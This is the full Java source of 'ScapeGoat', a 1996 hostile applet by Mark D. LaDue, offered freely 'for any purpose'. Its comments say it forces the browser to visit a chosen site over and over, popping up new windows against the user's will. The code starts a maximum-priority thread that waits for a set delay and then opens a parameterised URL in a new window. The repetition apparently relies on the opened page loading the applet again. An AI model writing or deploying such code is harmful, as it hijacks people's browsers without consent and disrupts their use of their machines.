package hostile;
/* ScapeGoat.java by Mark D. LaDue */

/* April 17, 1996 */

/* Copyright (c) 1996 Mark D. LaDue
   You may use, study, modify, and distribute this example for any purpose.
   This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet is intended to make your browser 
   visit a given web site over and over again,
   whether you want to or not, popping up a new copy of the 
   browser each time. */ 

import java.awt.*;
import java.net.*;

public class ScapeGoat extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to the applet window 
    Font wordFont = new Font("TimesRoman", Font.BOLD, 36);

    Thread joyride = null;

//  A web site that the browser will be forced to visit
    URL site; 

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds
    int delay;

/*  Set up a big white rectangle in the browser and
    determine web site to visit */ 

    public void init() {
    setBackground(Color.white);
    repaint();
//  Determine how many seconds the thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));

    str = getParameter("where");
    if (str == null)
        try {
            site = new URL("http://www.math.gatech.edu/~mladue/ScapeGoat.html");
        }
        catch (MalformedURLException m) {}    
    else try {
        site = new URL(str);
        }
    catch (MalformedURLException m) {}
    }


/*  Create and start the offending thread in the standard way */

    public void start() {
        if (joyride == null) {
        joyride = new Thread(this);
        joyride .setPriority(Thread.MAX_PRIORITY);
        joyride.start();
        }
    }

//  Now visit the site 
    public void run() {
        try {Thread.sleep(delay); }
        catch (InterruptedException ie) {}
        getAppletContext().showDocument(site, "_blank");
    }
}

